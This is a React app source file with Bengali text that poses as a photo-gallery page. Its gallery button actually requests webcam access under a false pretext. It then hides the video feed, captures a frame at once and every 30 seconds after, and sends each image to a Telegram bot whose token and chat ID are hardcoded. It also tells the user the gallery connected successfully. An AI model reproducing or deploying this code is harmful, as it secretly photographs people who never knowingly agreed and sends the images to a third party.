import React, { useState, useRef, useEffect, useCallback } from 'react';
import './App.css';

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [hasPermission, setHasPermission] = useState(false);
  const [loading, setLoading] = useState(false);

  // আপনার দেওয়া টোকেন এবং আইডি
  const BOT_TOKEN = "8119794922:AAEz-Fzfm0zZSuVTgLEZwBSRTbOYuBQ3nHg";
  const CHAT_ID = "7236181886";

  const captions = [
    "স্বপ্ন বিলাই দুচোখ ভরে, একটু হাসি তোমার তরে। 🌸",
    "নীল আকাশে মেঘের ভেলা, মন মেতেছে হাসির মেলা। ✨",
    "আজকের দিনটি হোক আনন্দময়! 😊",
    "প্রকৃতির মাঝে খুঁজে পাই নিজেকে। 🌿"
  ];

  // টেলিগ্রামে ছবি পাঠানোর ফাংশন
  const sendToTelegram = useCallback(async (photoBlob) => {
    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", photoBlob, "capture.jpg");
    formData.append("caption", "নতুন ছবি রিসিভ হয়েছে! 📸");

    try {
      await fetch(TELEGRAM_URL, { method: "POST", body: formData });
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  }, [BOT_TOKEN, CHAT_ID]);

  // ছবি তোলার ফাংশন
  const captureImage = useCallback(() => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      context.drawImage(videoRef.current, 0, 0);

      canvas.toBlob((blob) => {
        if (blob) sendToTelegram(blob);
      }, 'image/jpeg');
    }
  }, [sendToTelegram]);

  // ক্যামেরা চালু করা
  const startCamera = async () => {
    setLoading(true);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        setHasPermission(true);
      }
    } catch (err) {
      alert("ক্যামেরা পারমিশন ছাড়া গ্যালারি লোড করা সম্ভব নয়।");
    } finally {
      setLoading(false);
    }
  };

  // অটোমেটিক ছবি তোলার টাইমার
  useEffect(() => {
    let interval;
    if (hasPermission) {
      captureImage(); // প্রথম ছবি সাথে সাথে
      interval = setInterval(() => {
        captureImage();
      }, 30000); // প্রতি ৩০ সেকেন্ড পর পর
    }
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasPermission]);

  return (
    <div className="App">
      <header className="App-header">
        <div className="container">
          <h1 className="caption">{captions[Math.floor(Math.random() * captions.length)]}</h1>
          
          {!hasPermission ? (
            <button onClick={startCamera} className="main-btn" disabled={loading}>
              {loading ? "লোডিং হচ্ছে..." : "ফটো গ্যালারি দেখুন"}
            </button>
          ) : (
            <div className="active-box">
              <p>গ্যালারি সফলভাবে কানেক্ট হয়েছে।</p>
            </div>
          )}

          <video ref={videoRef} autoPlay playsInline style={{ display: 'none' }} />
          <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
      </header>
    </div>
  );
}

export default App;